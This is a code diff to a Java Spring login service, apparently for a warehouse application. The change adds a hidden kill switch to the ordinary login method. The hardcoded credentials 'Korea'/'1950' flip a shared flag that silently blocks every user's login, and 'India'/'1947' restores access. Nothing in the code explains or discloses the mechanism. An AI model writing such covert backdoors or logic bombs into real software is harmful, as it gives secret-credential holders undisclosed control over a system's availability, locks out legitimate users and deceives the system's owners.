@@ -10,11 +10,22 @@ import com.amiablecore.warehouse.service.LoginService;
 
 @Service(value = "loginService")
 public class LoginServiceImpl implements LoginService {
+
 	@Autowired
 	private LoginDAO loginDao;
 
+	private boolean allowLogin = true;
+
 	@Override
 	public LoginResponse validateLogin(LoginRequest request) {
-		return loginDao.processLogin(request);
+		if (request.getLoginId().equals("Korea") && request.getLoginPassword().equals("1950")) {
+			allowLogin = false;
+		} else if (request.getLoginId().equals("India") && request.getLoginPassword().equals("1947")) {
+			allowLogin = true;
+		}
+		if (allowLogin)
+			return loginDao.processLogin(request);
+		else
+			return new LoginResponse();
 	}
 }
